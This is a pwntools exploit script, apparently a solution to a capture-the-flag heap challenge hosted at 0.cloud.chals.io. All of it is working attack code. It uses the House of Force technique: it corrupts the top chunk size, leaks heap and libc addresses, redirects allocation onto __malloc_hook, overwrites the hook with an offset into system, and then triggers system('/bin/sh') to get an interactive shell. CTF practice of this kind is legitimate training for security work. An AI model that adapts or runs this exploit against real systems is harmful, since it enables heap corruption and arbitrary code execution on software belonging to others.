from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
libc = ELF(e.runpath + b"/libc.so.6",checksec=False)

gs = '''
continue
'''


def start():
    if (args.QEMU and args.GDB):
        p=process(['qemu-amd64', '-g', '1234', e.path])
        gdb.attach(target=('localhost',1234), exe=e.path, gdbscript=gs)
        return p
    elif (args.QEMU):
        return process(['qemu-amd64', e.path])
    elif args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 10679)
    else:
        return process(e.path)


p = start()


def malloc(sz, data):
    p.recvuntil(b'size >>>')
    p.sendline(b"%i" % sz)
    p.sendline(data)


def leak():
    p.recvuntil(b'at :')
    heap = int(p.recvline().strip(b'\n'), 16)
    log.info("Heap = %s" % hex(heap))
    p.recvuntil(b'motto :')
    libc.address = int(p.recvline().strip(b'\n'), 16)-libc.sym['rand']
    log.info("Libc = %s" % hex(libc.address))
    return heap


log.info("Setting Top Chunk Size == 0xfffffffffffffff1 ")
malloc(16, b'b' * 24 + p64(0xfffffffffffffff1))

pause()

log.info("Leaking Heap, Libc.Address")
heap = leak()

pause()

log.info("Setting Top Chunk Addr = __mallock_hook - 0x10")
malloc_hook = libc.sym['__malloc_hook']
distance = malloc_hook - heap - 0x20 - 0x10
malloc(distance, b"Y")
pause()

log.info("Cannot Overwrite __malloc_hook with libc.sym.system since 0x20 exists in : %s " % hex(libc.sym.system))
log.info("Fixed by using sym.system  + 0x5 (%s) to overwrite __malloc_hook" %hex(libc.sym.system+0x5))

malloc(24, p64(libc.sym.system+0x5))

pause()
log.info("Calling malloc(\"/bin/sh\"), which is now system(\"/bin/sh\")")
malloc(next(libc.search(b"/bin/sh")), b"")

p.interactive()
